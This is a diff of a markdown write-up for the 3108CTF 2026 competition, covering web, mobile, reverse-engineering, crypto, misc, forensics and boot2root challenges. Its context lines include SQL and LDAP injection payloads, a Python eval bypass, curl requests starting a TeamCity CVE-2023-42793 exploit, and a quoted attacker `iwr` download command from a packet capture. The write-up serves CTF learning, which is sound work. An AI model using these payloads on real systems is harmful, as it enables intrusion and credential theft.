@@ -1,5 +1,4 @@
 ---
-
 title: "Bahtera CTF 2026 Writeup"
 
 date: 2026-08-31
@@ -15,6 +14,7 @@ description: "Writeup for bahtera 2026"
 pond: true
 
 ctf_event: "3108CTF 2026"
+ctf_category: "Mixed"
 
 ---
 
@@ -85,17 +85,19 @@ Disclaimer: This writeup is AI-assisted (Yes, i asked ChatGPT to help me do it b
 
 ---
 
-# WEB EXPLOITATION
+## WEB EXPLOITATION
 
 ---
 
 ## 1. Kesultanan Pahang
 
-![Screenshot-1](screenshots/Screenshot-1.png)
+![Screenshot-1](/assets/images/ctf/3108CTF-2026/Screenshot-1.png)
 
 ### Challenge overview
 
 I was given the source code for a Laravel portal. The description hinted that it had been deployed in a hurry, so I started by checking the framework configuration, development endpoints and dependency versions.
+
+
 
 #### Source code review
 
@@ -113,6 +115,8 @@ I confirmed that:
 2. its solution handler could operate on an attacker-selected path;
 3. the Laravel log was writable by the web process; and
 4. a crafted serialized PHP gadget could therefore be placed in the log and later interpreted as a PHAR archive.
+   
+   
 
 #### Exploitation path
 
@@ -125,6 +129,8 @@ I used `storage/logs/laravel.log` as the intermediate file.
 5. Trigger deserialization of the gadget chain and obtain command execution in the container.
 
 The helper script reported the first attempt as a failure because it received HTTP 200, but the command had actually executed. I checked the response directly before continuing.
+
+
 
 #### Locating the real flag
 
@@ -146,7 +152,7 @@ It was a decoy. I searched the filesystem, found `/flag.txt` and read the real f
 
 ## 2. Titah Laju 2
 
-![Screenshot-2](screenshots/Screenshot-2.png)
+![Screenshot-2](/assets/images/ctf/3108CTF-2026/Screenshot-2.png)
 
 ### Challenge overview
 
@@ -164,6 +170,8 @@ eval(wpm.lower())
 ```
 
 The application also ran with Flask debugging enabled. This meant an exception could disclose its details through the Werkzeug traceback page.
+
+
 
 #### Understanding the restrictions
 
@@ -192,6 +200,8 @@ bytes
 ```
 
 That was enough to construct the filename, read its first line and leak it through an exception.
+
+
 
 #### Constructing `flag.txt` without quotes
 
@@ -236,6 +246,8 @@ open(next(open(PATH)))
 
 If the first line contained `3108{...}`, Python attempted to open a file with that flag as its name. The file did not exist, so Flask raised a `FileNotFoundError`. Because the Werkzeug debugger was enabled, the failed filenameincluding the flagappeared in the returned traceback.
 
+
+
 #### Final payload
 
 Combining the pieces produced:
@@ -255,6 +267,8 @@ curl -G 'https://TARGET/rate' \
 
 The response returned HTTP 500 with a Werkzeug traceback. Inside the `FileNotFoundError`, I found the real remote flag. The `3108{bukan_flag}` value supplied with the local files was only a decoy.
 
+
+
 #### Flag
 
 ```text
@@ -265,7 +279,7 @@ The response returned HTTP 500 with a Werkzeug traceback. Inside the `FileNotFou
 
 ## 3. Direktori Sultan Selangor
 
-![Screenshot-3](screenshots/Screenshot-3.png)
+![Screenshot-3](/assets/images/ctf/3108CTF-2026/Screenshot-3.png)
 
 ### Challenge overview
 
@@ -276,6 +290,8 @@ The target was:
 ```text
 https://selangor.bahterasiber.my/
 ```
+
+#### 
 
 #### Finding the search request
 
@@ -293,6 +309,8 @@ In the browser developer tools, I watched the Network tab while submitting the f
 
 The exact parameter name was more important than the visible form itself because it gave me a direct way to repeat the request and change only the search value.
 
+
+
 #### Testing for SQL injection
 
 After a few minutes of checking the normal search behavior, I tested whether a quote changed the server response:
@@ -309,6 +327,8 @@ muhammad' OR 1=1--
 ```
 
 The result set changed, confirming that the search value was being concatenated into a SQL query without proper parameterization. The `--` marker commented out the rest of the original query, allowing the injected condition to control the result.
+
+
 
 #### Identifying the database layout
 
@@ -332,6 +352,8 @@ If the original query required additional columns, I padded the result with cons
 muhammad' UNION SELECT 1,sqlite_version(),3,4--
 ```
 
+
+
 #### Enumerating tables and columns
 
 SQLite stores its schema in `sqlite_master`. I used that table to identify the application tables:
@@ -352,6 +374,8 @@ WHERE type='table'--
 
 This showed which column contained the stored secret. The directory was not filtering the injected value into a separate safe search parameter; the SQL expression was executed by the backend and its first selected column was rendered in the results page.
 
+
+
 #### Extracting the secret
 
 The final request selected the flag-bearing column from the discovered table. The general form was:
@@ -371,6 +395,8 @@ curl -G 'https://selangor.bahterasiber.my/search' \
 
 The returned directory page displayed the extracted value in the normal search-results area. The vulnerability was therefore a classic UNION-based SQLite injection rather than a client-side-only issue.
 
+
+
 #### Flag
 
 ```text
@@ -381,7 +407,7 @@ The returned directory page displayed the extracted value in the normal search-r
 
 ## 4. Titah Firman Diraja
 
-![Screenshot-4](screenshots/Screenshot-4.png)
+![Screenshot-4](/assets/images/ctf/3108CTF-2026/Screenshot-4.png)
 
 ### Challenge overview
 
@@ -393,6 +419,8 @@ The page presented a list of Selangor rulers and asked me to uncover a secret hi
 
 The page looked like a normal directory, but the name search was processed by a backend directory service. I focused on the request parameter rather than the HTML layout.
 
+
+
 #### Inspecting the name search
 
 I opened the Sultan list, searched for an ordinary name and watched the request in the browser Network panel. The search value was sent through a parameter named `name` on:
@@ -402,6 +430,8 @@ https://diraja.bahterasiber.my/
 ```
 
 I replayed the normal request first to establish the expected response, then tested an unmatched value and a wildcard. The wildcard behavior showed that the backend was not using a SQL query; the results were consistent with an LDAP directory search.
+
+
 
 #### Confirming LDAP injection
 
@@ -426,6 +456,8 @@ curl -G 'https://diraja.bahterasiber.my/' \
   --data-urlencode 'name=*)(objectClass=*)'
 ```
 
+
+
 #### Finding the hidden attribute
 
 The normal page displayed public Sultan information, but the injected response included an additional directory attribute named:
@@ -446,6 +478,8 @@ rg -n -i 'rahsia|3108\{' response.html
 
 The `rahsia` value contained the flag directly. I did not need to enumerate unrelated accounts or dump the whole directory; the hidden attribute was enough to answer the challenge.
 
+
+
 #### Flag
 
 ```text
@@ -456,17 +490,19 @@ The `rahsia` value contained the flag directly. I did not need to enumerate unre
 
 ---
 
-# MOBILE EXPLOITATION
+## MOBILE EXPLOITATION
 
 ---
 
 ## 1. Bahtera Pomodoro
 
-![Screenshot-5](screenshots/Screenshot-5.png)
+![Screenshot-5](/assets/images/ctf/3108CTF-2026/Screenshot-5.png)
 
 ### Challenge overview
 
-I received an Android Pomodoro application. The description suggested that repeated interaction would reveal something, but since I had the APK, I went straight to static analysis.
+I received an Android Pomodoro application. The description suggested that there is a hidden flag inside the apk so we need to play hide and seek with this apk.
+
+
 
 #### Initial inspection
 
@@ -479,7 +515,11 @@ aapt dump badging bahtera.apk
 jadx --deobf -d bahtera-jadx bahtera.apk
 ```
 
+![](/assets/images/ctf/3108CTF-2026/Screenshot-36.png)
+
 In JADX, I found `PomodoroViewModel`, which handled both the timer and the hidden interaction counter. The intended UI route was to press **Touchme** 20 times within 60 seconds.
+
+
 
 #### Recovering the flag statically
 
@@ -490,27 +530,11 @@ MzEwOHt5MHVfZjB1
 bmRfbTNfZ3I0dHp6fQ==
 ```
 
-I joined the fragments and decoded them as one Base64 value:
+![](/assets/images/ctf/3108CTF-2026/Screenshot-37.png)
 
-```python
-import base64
+Just put into Cyberchef and click on the magic wand to decode.
 
-parts = [
-    "MzEwOHt5MHVfZjB1",
-    "bmRfbTNfZ3I0dHp6fQ==",
-]
 
-flag = base64.b64decode("".join(parts)).decode()
-print(flag)
-```
-
-Output:
-
-```text
-3108{y0u_f0und_m3_gr4tzz}
-```
-
-I also found an exported broadcast receiver that revealed the `3108{...}` format, but the actual flag came from the two strings in `PomodoroViewModel`.
 
 #### Flag
 
@@ -522,13 +546,13 @@ I also found an exported broadcast receiver that revealed the `3108{...}` format
 
 ---
 
-# REVERSE ENGINEERING
+## REVERSE ENGINEERING
 
 ---
 
 ## 1. Adat Istiadat Raja
 
-![Screenshot-6](screenshots/Screenshot-6.png)
+![Screenshot-6](/assets/images/ctf/3108CTF-2026/Screenshot-6.png)
 
 ### Challenge overview
 
@@ -538,7 +562,7 @@ I received a stripped, PIE-enabled x86-64 Linux executable. The description emph
 ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
 ```
 
-The flag was not stored as a printable string. The program first validated a sequence, then used the resulting state to decrypt a blob.
+
 
 #### Reversing the validator
 
@@ -552,9 +576,13 @@ Because the chain was deterministic, I could invert each check once I knew the p
 
 I could not simply patch the success branch because the accepted bytes also built the 64-bit seed used for decryption.
 
+
+
 #### Decrypting the data blob
 
 After the check, I found a SplitMix64-style generator producing a keystream. The program XORed that stream with a 37-byte blob in `.rodata`.
+
+
 
 My solve followed the original program flow:
 
@@ -564,6 +592,8 @@ My solve followed the original program flow:
 4. let the original decryption routine process the `.rodata` blob.
 
 I supplied the recovered sequence to the unmodified binary and it printed the flag.
+
+
 
 #### Flag
 
@@ -575,7 +605,7 @@ I supplied the recovered sequence to the unmodified binary and it printed the fl
 
 ## 2. Istana Guard
 
-![Screenshot-7](screenshots/Screenshot-7.png)
+![Screenshot-7](/assets/images/ctf/3108CTF-2026/Screenshot-7.png)
 
 ### Challenge overview
 
@@ -587,27 +617,16 @@ PE32+ executable for MS Windows, x86-64 Mono/.NET assembly
 
 The assembly was not obfuscated, so its metadata, method names and IL were still readable.
 
+
+
 #### Static analysis
 
-While reviewing the metadata, I found a method named:
+I use dnSpy to do static analysis and found the `NegeriSembilanChallenge`. Since it look interesting I take a look and found this:
+![loading-ag-6318](/assets/images/ctf/3108CTF-2026/Screenshot-38.png)
 
-```text
-MaterialiseFlag
-```
+Just combine all and solved.
 
-The method referenced several flag fragments. I followed the IL instead of trusting the order returned by `strings`.
 
-Conceptually, the method performed the following operation:
-
-```csharp
-var result = new StringBuilder();
-result.Append(fragment1);
-result.Append(fragment2);
-// ...seven more fragments...
-return result.ToString();
-```
-
-There were nine user-string tokens. Following each `ldstr` and `StringBuilder.Append` instruction gave me the correct order and the complete flag.
 
 #### Flag
 
@@ -619,29 +638,29 @@ There were nine user-string tokens. Following each `ldstr` and `StringBuilder.Ap
 
 ## 3. House of
 
-![Screenshot-8](screenshots/Screenshot-8.png)
+![Screenshot-8](/assets/images/ctf/3108CTF-2026/Screenshot-8.png)
 
 ### Challenge overview
 
 I was given a stripped native 64-bit Windows PE. The portal clue said that everything began with the first step.
 
+
+
 #### Investigation
 
-At first I assumed the password check unlocked or decrypted the flag. Static analysis showed that it did neither.
+I use Detect It Easy (DIE) to find the flag. I simply use the strings and searched `3108`
 
-I used:
+![](/assets/images/ctf/3108CTF-2026/Screenshot-32.png)
 
-```bash
-file house-of.exe
-strings -a -n 4 house-of.exe
-objdump -h house-of.exe
-objdump -s -j .rdata house-of.exe
-objdump -d -Mintel house-of.exe
-```
+The flag is directly shown there. I think the challenge creator actually wants us to find out about the password feature and get the password(flag) by decompile the file. 
 
-The password logic only controlled the `Access Granted` message. It was not used as a key and had no effect on the flag.
 
-I found the full flag as a literal in the PE's read-only data section. The password prompt was just misdirection.
+
+![](/assets/images/ctf/3108CTF-2026/Screenshot-33.png)
+
+Honestly If I am the Challenge Creator, I would encode the flag to avoid people one shotting by command strings.
+
+
 
 #### Flag
 
@@ -653,13 +672,17 @@ I found the full flag as a literal in the PE's read-only data section. The passw
 
 ## 4. Kuning Berdaulat
 
-![Screenshot-9](screenshots/Screenshot-9.png)
+![Screenshot-9](/assets/images/ctf/3108CTF-2026/Screenshot-9.png)
 
 ### Challenge overview
 
 I received a 64-bit Linux executable named `panji`. Running it presented a 12-question quiz about the royal institutions, states, symbols and history of Malaysia.
 
-The questions could have been researched manually, but the challenge was in the Reverse Engineering category. I inspected the binary to recover the exact accepted answers and their required wording.
+
+
+The questions could have been researched manually but the challenge was in the Reverse Engineering category so I inspected the binary to recover the exact accepted answers and their required wording.
+
+
 
 #### Initial inspection
 
@@ -675,7 +698,11 @@ nm -n panji | grep -E \
 
 The executable was not stripped, so symbols such as `main`, `panji_data` and `seg_sz` made the important data flow easier to follow.
 
+
+
 Disassembling `main` showed a loop that processed 12 encrypted records. Each submitted answer was normalized and compared with a decrypted value. Only after every comparison succeeded did the program attempt to open `flag.txt`.
+
+
 
 #### Recovering the AES key
 
@@ -703,6 +730,8 @@ b'Dirgahayu Tuanku'
 ```
 
 This was a valid 16-byte AES-128 key.
+
+
 
 #### Extracting the encrypted records
 
@@ -750,6 +779,8 @@ done
 
 The decrypted records revealed the exact accepted responses.
 
+
+
 #### Recovered answer sequence
 
 The 12 answers had to be submitted in this order:
@@ -769,7 +800,7 @@ kanan
 tahun 1952
 ```
 
-I verified the sequence against the local binary:
+Then I verified the sequence against the local binary:
 
 ```bash
 printf '%s\n' \
@@ -787,28 +818,13 @@ printf '%s\n' \
   'tahun 1952' | ./panji
 ```
 
-All 12 checks passed. The local copy then reported that `flag.txt` was unavailable, which confirmed that the downloadable binary did not contain the real flag.
+All 12 checks passed.
+
+
 
 #### Retrieving the remote flag
 
-I checked the binary for a hidden or appended flag before relying on the remote service:
-
-```bash
-grep -aob '3108{' panji
-strings -a panji | grep -Ei '3108|flag\{'
-readelf -S panji
-stat -c '%s bytes' panji
-```
-
-There was no flag-shaped string or appended ELF overlay. The success branch was equivalent to:
-
-```c
-FILE *file = fopen("flag.txt", "r");
-fgets(flag, 128, file);
-printf("Flag: %s", flag);
-```
-
-I therefore sent the recovered answers to the live service in one request stream:
+I sent all answer in one stream:
 
 ```bash
 printf '%s\n' \
@@ -826,7 +842,9 @@ printf '%s\n' \
   'tahun 1952' | nc 168.144.106.166 30006
 ```
 
-After the final accepted answer, the remote instance read its `flag.txt` and returned the flag.
+Then I get the flag for solving all.
+
+
 
 #### Flag
 
@@ -838,13 +856,13 @@ After the final accepted answer, the remote instance read its `flag.txt` and ret
 
 ---
 
-# CRYPTO
+## CRYPTO
 
 ---
 
 ## 1. Tertib Balairung
 
-![Screenshot-10](screenshots/Screenshot-10.png)
+![Screenshot-10](/assets/images/ctf/3108CTF-2026/Screenshot-10.png)
 
 ### Challenge overview
 
@@ -861,6 +879,8 @@ I counted 45 characters, so I split it into nine blocks of five:
 {BK_G  0TT4U  1NNCX  R__NX
 ```
 
+#### 
+
 #### Deriving the arrangement
 
 I treated the nine blocks as columns and used the historical clue to order them. With zero-based indices, the permutation was:
@@ -876,6 +896,8 @@ In one-based form, this is:
 ```
 
 After arranging the columns, I read the five rows horizontally and reversed direction on every row: left-to-right, then right-to-left. This is a boustrophedon transposition.
+
+#### 
 
 #### Reproducible decoder
 
@@ -895,13 +917,7 @@ for row in range(5):
 print("".join(plaintext).rstrip("X"))
 ```
 
-Output:
-
-```text
-3108{51RIH_N0B4T_T3NTUK4N_KUNC1_B4L41RUNG}
-```
-
-I removed the final three `X` characters because they only padded the rectangular grid.
+#### 
 
 #### Flag
 
@@ -913,7 +929,7 @@ I removed the final three `X` characters because they only padded the rectangula
 
 ## 2. Surat Pertabalan
 
-![Screenshot-11](screenshots/Screenshot-11.png)
+![Screenshot-11](/assets/images/ctf/3108CTF-2026/Screenshot-11.png)
 
 ### Challenge overview
 
@@ -924,6 +940,8 @@ KERAJAAN
 ```
 
 I extracted the archive with the password `infected` and inspected the macro-enabled document statically.
+
+
 
 #### Extracting the hidden data
 
@@ -947,7 +965,7 @@ Which is I believe is the flag format.
 
 Just use cyberchef with the given key:
 
-![Screenshot-29](screenshots/Screenshot-29.png)
+![Screenshot-29](/assets/images/ctf/3108CTF-2026/Screenshot-29.png)
 
 Output:
 
@@ -956,6 +974,8 @@ PANJI_PANJI_BERKIBAR
 ```
 
 Then use the flag format given earlier.
+
+
 
 #### Flag
 
@@ -967,7 +987,7 @@ Then use the flag format given earlier.
 
 ## 3. Warkah Tergulung
 
-![Screenshot-12](screenshots/Screenshot-12.png)
+![Screenshot-12](/assets/images/ctf/3108CTF-2026/Screenshot-12.png)
 
 ### Challenge overview
 
@@ -1007,6 +1027,8 @@ RSA LSB oracle
   -> exploit e2 = 3 and the short unknown suffix
   -> recover the flag with an exact integer cube root
 ```
+
+#### 
 
 #### Recovering the prefix with the LSB oracle
 
@@ -1077,6 +1099,8 @@ flag = message - A
 ```
 
 When `message^3 == target`, the recovered suffix was the flag. This avoided needing Sage for the Coppersmith stage.
+
+#### 
 
 #### Solver
 
@@ -1254,6 +1278,8 @@ with socket.create_connection((HOST, PORT), timeout=5) as sock:
 
 The recovered plaintext was already in the event's flag format.
 
+
+
 #### Flag
 
 ```text
@@ -1264,8 +1290,7 @@ The recovered plaintext was already in the event's flag format.
 
 ## 4. Surat Pahlawan
 
-![Screenshot-13](screenshots/Screenshot-13.png)
-
+![Screenshot-13](/assets/images/ctf/3108CTF-2026/Screenshot-13.png)
 
 ### Challenge overview
 
@@ -1296,6 +1321,8 @@ intercept DH public values
   -> submit it within the same session
   -> decode the returned encrypted ZIP
 ```
+
+#### 
 
 #### Inspecting the intercepted message
 
@@ -1331,6 +1358,8 @@ Perahu_Jong_Melaka
 However, submitting it later failed. After a few minutes of checking the arithmetic, I realized the cryptography was correct and the service was rotating its challenge state. Every request to `/intercept` created a fresh short-lived session with a different secret phrase.
 
 I therefore combined interception, cracking, decryption and verification in one script. A `requests.Session` preserved the session cookie and the script submitted the plaintext immediately after recovering it.
+
+#### 
 
 #### Automated solver
 
@@ -1444,6 +1473,8 @@ cat final_flag.txt
 
 The archive used WinZip AES-256 encryption and contained one file named `final_flag.txt`. Extracting it with the supplied password revealed the final flag.
 
+#### 
+
 #### Flag
 
 ```text
@@ -1454,24 +1485,19 @@ The archive used WinZip AES-256 encryption and contained one file named `final_f
 
 ---
 
-# MISC
+## MISC
 
 ---
 
 ## 1. Cap Mohor Sembilan Mata
 
-![Screenshot-14](screenshots/Screenshot-14.png)
+![Screenshot-14](/assets/images/ctf/3108CTF-2026/Screenshot-14.png)
 
 ### Challenge overview
 
 I received a 6×6 letter grid and a royal seal with nine openings. I treated the seal as a turning grille placed over the grid.
 
-The inscription told me to:
-
-1. determine the year in which the first Melaka ruler to use the title **Sultan** ascended the throne;
-2. take the third digit of that year as the number of initial clockwise rotations.
-
-After every reading, the seal had to be rotated again. Letters visible through the openings were read from left to right and top to bottom.
+#### 
 
 #### Finding the initial rotation
 
@@ -1482,6 +1508,8 @@ The ruler was Sultan Muhammad Shah, whose accession year for this puzzle was:
 ```
 
 The third digit is `2`, so I rotated the seal clockwise twice, or 180 degrees, before reading it.
+
+
 
 #### Reading the grille
 
@@ -1506,6 +1534,8 @@ After adding word boundaries, the message was:
 MOHOR DIRAJA MELAKA BERMATA SEMBILAN EMAS
 ```
 
+#### 
+
 #### Flag
 
 ```text
@@ -1516,7 +1546,7 @@ MOHOR DIRAJA MELAKA BERMATA SEMBILAN EMAS
 
 ## 2. Persemadian Seorang Raja
 
-![Screenshot-15](screenshots/Screenshot-15.png)
+![Screenshot-15](/assets/images/ctf/3108CTF-2026/Screenshot-15.png)
 
 ### Challenge overview
 
@@ -1547,6 +1577,8 @@ only surviving tomb Sultan Melaka Malaysia
 
 This identified **Sultan Alauddin Riayat Shah**, the seventh Sultan of Melaka. He reigned from 1477 until 1488, succeeding his father Sultan Mansur Shah. His son and successor was Sultan Mahmud Shah, who later lost Melaka in 1511.
 
+
+
 #### Locating the tomb
 
 With the Sultan identified, I searched directly for his burial place:
@@ -1570,6 +1602,8 @@ Johor
 
 This matched the clue about a village whose name acknowledged the presence of a ruler. It also fixed the last three components required by the flag.
 
+
+
 #### Resolving Pagoh and Jorak
 
 Some sources associate Kampung Raja with the wider Jorak administrative area, while most descriptions of the tomb use Pagoh as the locality. I initially considered both forms:
@@ -1581,16 +1615,7 @@ ALAUDDINRIAYATSHAH_PAGOH_MUAR_JOHOR
 
 The challenge accepted `PAGOH`, which also matches the postcode address in the official mosque record.
 
-#### Formatting the flag
 
-I removed spaces and the title `Sultan` from the ruler's name, converted it to uppercase and joined it with the location components:
-
-```text
-ALAUDDINRIAYATSHAH
-PAGOH
-MUAR
-JOHOR
-```
 
 #### Flag
 
@@ -1602,13 +1627,15 @@ JOHOR
 
 ## 3. Titah Laju 1
 
-![Screenshot-16](screenshots/Screenshot-16.png)
+![Screenshot-16](/assets/images/ctf/3108CTF-2026/Screenshot-16.png)
 
 ### Challenge overview
 
 This challenge presented a typing-speed test based on historical royal proclamations. Each stage displayed a sentence that had to be typed quickly enough to meet the required WPM. Completing every stage revealed the flag.
 
 I initially tried typing the sentences normally, but the speed requirement made that approach unreliable. Since the challenge ran in the browser, I inspected how the page handled the input and timer instead.
+
+
 
 #### Understanding the timing check
 
@@ -1622,6 +1649,8 @@ The script needed to perform four tasks:
 2. find the proclamation displayed nearest to that input;
 3. inject the first character followed by the complete sentence; and
 4. continue through every stage until the flag appeared.
+   
+   
 
 #### Browser-console payload
 
@@ -1808,13 +1837,13 @@ Disclaimer: This payload needs to run 2-3 times to fully solve lol
 
 ---
 
-# FORENSICS
+## FORENSICS
 
 ---
 
 ## 1. Cap Mohor Yang Hilang
 
-![Screenshot-17](screenshots/Screenshot-17.png)
+![Screenshot-17](/assets/images/ctf/3108CTF-2026/Screenshot-17.png)
 
 ### Challenge overview
 
@@ -1831,11 +1860,7 @@ I needed to recover a three-part verification number:
 - **B:** recovered from a deleted audio recording; and
 - **C:** stored in a password-protected container using A as its password.
 
-The final format was:
-
-```text
-3108{A_B_C}
-```
+#### 
 
 #### Part A: repairing the seal image
 
@@ -1861,6 +1886,8 @@ Therefore:
 A = LAKSAMANA749
 ```
 
+#### 
+
 #### Part B: recovering the deleted recording
 
 The audio was missing from the normal directory listing, but I recovered its data from the image. Playing the WAV normally did not reveal anything useful.
@@ -1876,6 +1903,8 @@ Therefore:
 ```text
 B = AYERLELEH23
 ```
+
+#### 
 
 #### Part C: finding the appended archive
 
@@ -1899,13 +1928,7 @@ Therefore:
 C = MOHOR1699
 ```
 
-#### Building the flag
 
-```text
-A = LAKSAMANA749
-B = AYERLELEH23
-C = MOHOR1699
-```
 
 #### Flag
 
@@ -1917,11 +1940,13 @@ C = MOHOR1699
 
 ## 2. Risalah Istana Anak Bukit
 
-![Screenshot-30](screenshots/Screenshot-30.png)
+![Screenshot-30](/assets/images/ctf/3108CTF-2026/Screenshot-30.png)
 
 ### Challenge overview
 
 I was given a large log file and a description about a palace circular that could not be opened. I started by filtering the normal server noise and looking for entries related to a document.
+
+
 
 #### Finding the document
 
@@ -1934,6 +1959,8 @@ Risalah Istana Anak Bukit.docx
 ```
 
 The log was only the first layer; it pointed to the actual document.
+
+
 
 #### Decrypting the Office document
 
@@ -1952,6 +1979,8 @@ a6_123
 
 After decrypting the DOCX, I unpacked it as OOXML and inspected the XML directly.
 
+
+
 #### Decoding the glyph substitution
 
 The text nodes in `word/document.xml` used symbols resembling the Standard Galactic Alphabet from Minecraft.
@@ -1966,6 +1995,8 @@ flag{almarhum_sultan_abdul_halim_mu'adzam_shah}
 
 I converted it to the event's `3108` format and uppercased the body.
 
+
+
 #### Flag
 
 ```text
@@ -1976,14 +2007,13 @@ I converted it to the event's `3108` format and uppercased the body.
 
 ## 3. Lagenda Sultan Kedah Tua
 
-![Screenshot-18](screenshots/Screenshot-18.png)
-![Screenshot-19](screenshots/Screenshot-19.png)
+![Screenshot-18](/assets/images/ctf/3108CTF-2026/Screenshot-18.png)
 
 ### Challenge overview
 
 The challenge provided a packet capture named `Kedah_Tua.pcap` and described an Active Directory environment that had been compromised. The historical clue referred to the first Sultan of Kedah and *Hikayat Merong Mahawangsa*.
 
-I treated the PCAP as forensic evidence and worked from a copy. My goal was to identify the hosts, reconstruct the intrusion timeline and follow any downloaded payloads until I found the flag.
+
 
 The complete chain recovered from the traffic was:
 
@@ -2004,11 +2034,7 @@ network reconnaissance
 
 I began by confirming the capture format and obtaining a high-level view of the traffic:
 
-```bash
-capinfos Kedah_Tua.pcap
-tshark -r Kedah_Tua.pcap -q -z endpoints,ip
-tshark -r Kedah_Tua.pcap -q -z conv,tcp
-```
+![](/assets/images/ctf/3108CTF-2026/Screenshot-34.png)
 
 Two internal hosts immediately stood out:
 
@@ -2038,6 +2064,8 @@ s.sulaimanshah / P@ssw0rd
 
 After that account authenticated, the attacker performed LDAP queries against the domain controller.
 
+
+
 #### Following the LDAP enumeration
 
 The LDAP results exposed another account whose name matched the historical clue:
@@ -2057,9 +2085,15 @@ Its `userAccountControl` value was:
 
 The important bit was `0x400000`, or `DONT_REQ_PREAUTH`. This setting allowed anyone to request an encrypted Kerberos AS-REP response for the account without first knowing its password. The response could then be taken offline for an AS-REP-roasting password attack.
 
+
+
 The name was also a deliberate historical reference. Sultan Muzaffar Shah I, associated in the legend with Raja Phra Ong Mahawangsa, was the first Sultan of Kedah. This confirmed that `s.muzaffarshah` was the account I needed to follow.
 
+
+
 Shortly after the Kerberos exchange, the capture showed a successful NTLM-authenticated WinRM connection to TCP port `5985` as `s.muzaffarshah`. Since the account belonged to `Administrators`, the attacker had obtained a privileged remote shell on the domain controller.
+
+
 
 #### Recovering the PowerShell stage
 
@@ -2076,13 +2110,9 @@ I isolated it with:
 http.request.method == "GET" && http.request.uri == "/update.ps1"
 ```
 
-Because the transfer used plain HTTP, I could recover the response through **File → Export Objects → HTTP** in Wireshark. The same extraction can be performed from the command line:
+Because the transfer used plain HTTP, I could recover the response through **File → Export Objects → HTTP** in Wireshark. 
 
-```bash
-mkdir -p http-objects
-tshark -r Kedah_Tua.pcap \
-  --export-objects http,http-objects
-```
+![](/assets/images/ctf/3108CTF-2026/Screenshot-35.png)
 
 The recovered `update.ps1` contained an encoded command. Decoding it revealed the actual second-stage action:
 
@@ -2091,6 +2121,8 @@ iwr https://raw.githubusercontent.com/f4rshad0w/checkup-script/refs/heads/main/s
 ```
 
 Despite the harmless-looking `WindowsUpdate.bat` name, the script came from a public GitHub repository rather than Microsoft. That made it the most useful artifact in the capture.
+
+
 
 #### Finding the reversed token
 
@@ -2127,6 +2159,8 @@ Output:
 
 I also checked the repository history to ensure the token existed at the time represented by the PCAP and had not been added later. The batch file predated the captured traffic, so it was a valid part of the challenge evidence.
 
+
+
 #### Confirming the post-exploitation activity
 
 The traffic continued after the staged download. The domain controller connected back to the attacker-controlled SMB share:
@@ -2143,6 +2177,12 @@ mimikatz.exe
 
 This final step confirmed that the traffic represented a real compromise chain: the attacker gained a privileged shell, staged a script and then retrieved a credential-dumping tool. It was not normal administrative activity or an isolated failed login.
 
+
+
+This is one of the BEST challenge throughout the competition. Standing ovation to the challenge creator for creating this one!
+
+
+
 #### Flag
 
 ```text
@@ -2153,11 +2193,13 @@ This final step confirmed that the traffic represented a real compromise chain: 
 
 ## 4. Layar Yang Menanti
 
-![Screenshot-20](screenshots/Screenshot-20.png)
+![Screenshot-20](/assets/images/ctf/3108CTF-2026/Screenshot-20.png)
 
 ### Challenge overview
 
 This challenge provided Windows forensic artifacts from a workstation where several users had been active. The useful evidence was not a normal screenshot. Instead, it was stored in the persistent bitmap cache created by the Windows Remote Desktop client.
+
+
 
 RDP saves small pieces of the remote screen so it can reuse them without transmitting the same pixels again. Those cached pieces can survive after the session ends, but they do not retain their original screen coordinates. The challenge was therefore a jigsaw puzzle made from thousands of small screen fragments.
 
@@ -2171,6 +2213,8 @@ identify the relevant user and session
   -> rebuild matching image fragments
   -> read the flag from the reconstructed screen
 ```
+
+
 
 #### Identifying the relevant user
 
@@ -2191,6 +2235,8 @@ Cache0001.bin
 
 The important point was that the notes only identified which session to investigate. They did not contain the flag themselves.
 
+
+
 #### Recognizing the RDP bitmap cache
 
 I checked the beginning of both files:
@@ -2208,14 +2254,13 @@ RDP8bmp\x00
 
 That identified the newer persistent RDP bitmap-cache format. The entries contained `64 x 64` pixel tiles stored as 32-bit BGRA data. Windows used these tiles to draw portions of the remote desktop during the session.
 
+
+
 #### Extracting the tiles with BMC-Tools
 
 I used [ANSSI-FR's BMC-Tools](https://github.com/ANSSI-FR/bmc-tools), which supports both `Cache????.bin` and older `bcache*.bmc` formats:
 
 ```bash
-git clone https://github.com/ANSSI-FR/bmc-tools.git
-mkdir -p cache-input extracted-tiles
-
 cp Cache0000.bin Cache0001.bin cache-input/
 python3 bmc-tools/bmc-tools.py \
   -s cache-input \
@@ -2224,6 +2269,8 @@ python3 bmc-tools/bmc-tools.py \
 ```
 
 The `-b` option also created aggregate bitmap sheets, which were useful for quickly reviewing the extracted content. However, a simple collage preserved cache order rather than screen position, so the text was still broken across unrelated parts of the image.
+
+
 
 #### Matching tile edges
 
@@ -2269,6 +2316,8 @@ cost = np.abs(a[:, -1, :3] - b[:, 0, :3]).mean()
 
 After rebuilding the fragments with the corrected direction, recognizable lines of text began to appear. I reviewed the best-connected clusters rather than forcing every cached tile into one giant image, since many tiles belonged to unrelated windows or earlier screen states.
 
+
+
 #### Recovering the screen text
 
 One reconstructed fragment showed the flag clearly across the recovered RDP screen:
@@ -2278,6 +2327,8 @@ One reconstructed fragment showed the flag clearly across the recovered RDP scre
 ```
 
 I checked the neighboring tiles to ensure the braces, capitalization and underscores were genuine screen pixels rather than a mistaken join. The complete string remained consistent across the reconstructed fragment.
+
+
 
 #### Flag
 
@@ -2289,13 +2340,13 @@ I checked the neighboring tiles to ensure the braces, capitalization and undersc
 
 ---
 
-# BOOT2ROOT
+## BOOT2ROOT
 
 ---
 
 ## 1. Warisan Takhta
 
-![Screenshot-21](screenshots/Screenshot-21.png)
+![Screenshot-21](/assets/images/ctf/3108CTF-2026/Screenshot-21.png)
 
 ### Challenge overview
 
@@ -2323,6 +2374,8 @@ TeamCity 2023.05.3
   -> become root
   -> recover a deleted image from Git history
 ```
+
+#### 
 
 #### Step 1: enumerate the target
 
@@ -2362,6 +2415,8 @@ http://teamcity.istana.bahtera/
 ```
 
 The footer identified the server as TeamCity 2023.05.3 build 129390. This release predates the 2023.05.4 security fix and is vulnerable to CVE-2023-42793.
+
+#### 
 
 #### Step 2: exploit TeamCity
 
@@ -2432,6 +2487,8 @@ curl -sS -o /dev/null -X POST -G \
 
 This route provides a shell as `tcuser` inside the TeamCity container.
 
+#### 
+
 #### Step 3: recover the SSH key and password
 
